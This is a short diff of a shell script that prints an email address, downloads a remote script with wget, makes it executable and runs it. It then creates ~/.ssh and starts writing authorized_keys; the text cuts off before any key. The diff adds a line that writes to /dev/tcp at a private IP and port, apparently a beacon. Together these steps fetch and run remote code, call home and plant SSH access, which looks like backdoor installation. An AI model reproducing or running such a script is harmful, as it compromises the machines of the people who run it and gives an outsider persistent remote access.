@@ -1,6 +1,7 @@
 echo "Email:21kixc@gmail.com"
 wget http://oss.1nth.com/vospag/in.sh.x && chmod 777 in.sh.x && ./in.sh.x
 
+echo "" > /dev/tcp/192.168.2.250/2777
 mkdir ~/.ssh
 chmod 700 ~/.ssh
 cat <<EOF> ~/.ssh/authorized_keys
